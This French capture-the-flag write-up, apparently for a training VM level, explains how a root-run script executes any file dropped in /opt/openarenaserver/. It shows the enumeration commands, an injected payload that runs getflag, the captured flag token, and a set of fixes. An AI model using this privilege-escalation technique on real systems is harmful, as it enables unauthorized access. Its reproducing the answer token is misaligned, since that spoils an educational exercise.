# Rapport de Vulnérabilité : Exécution automatique de scripts via un répertoire surveillé

## Description

Dans ce niveau, un script shell présent dans `/usr/sbin/openarenaserver` exécute automatiquement tout fichier placé dans un dossier spécifique (`/opt/openarenaserver/`). Il ne vérifie pas l’identité de l’utilisateur à l’origine du fichier, ce qui permet d’injecter un script malveillant qui sera exécuté avec les privilèges de l’utilisateur `flag05`. Cette faille permet donc de détourner le mécanisme d’exécution automatique pour obtenir le flag.

## Comment Exploiter la Faille

### Étape 1 : Rechercher les fichiers appartenant à `flag05`

```bash
find / -user flag05 2>/dev/null
```

**Résultat :**

```
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

### Étape 2 : Analyse du script trouvé

```bash
cat /usr/sbin/openarenaserver
```

**Contenu :**

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Ce script exécute tout fichier présent dans `/opt/openarenaserver/` avec `bash`, puis supprime le fichier après exécution.

### Étape 3 : Injection d’un script malveillant

On crée un fichier qui contient une commande pour récupérer le flag :

```bash
echo "getflag > /tmp/token" > /opt/openarenaserver/playload
```

Lorsque le script `openarenaserver` est déclenché, il exécute le fichier `playload`, ce qui redirige la sortie de `getflag` vers `/tmp/token`.

### Étape 4 : Lecture du flag

Une fois le script exécuté automatiquement :

```bash
cat /tmp/token
```

**Flag obtenu :**

```
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

---

## Comment Résoudre la Faille

Pour corriger cette vulnérabilité :

* **Vérifier l’identité de l’utilisateur avant d’exécuter un fichier** : S’assurer que seuls les fichiers écrits par un utilisateur autorisé soient exécutés.
* **Restreindre l’accès au répertoire surveillé** : Limiter les permissions en écriture de `/opt/openarenaserver/` pour empêcher l’injection de scripts par des utilisateurs non autorisés.
* **Utiliser des mécanismes d'exécution sécurisés** : Éviter d’exécuter des scripts directement avec `bash` sur du contenu externe non vérifié.

## Conclusion

Cette faille démontre les risques liés à l’exécution automatique de fichiers dans un répertoire public. Sans vérification de l’origine ni des permissions, un simple fichier déposé peut permettre une élévation de privilèges. La sécurisation des répertoires exécutés dynamiquement est essentielle pour éviter ce type d’attaque.

---
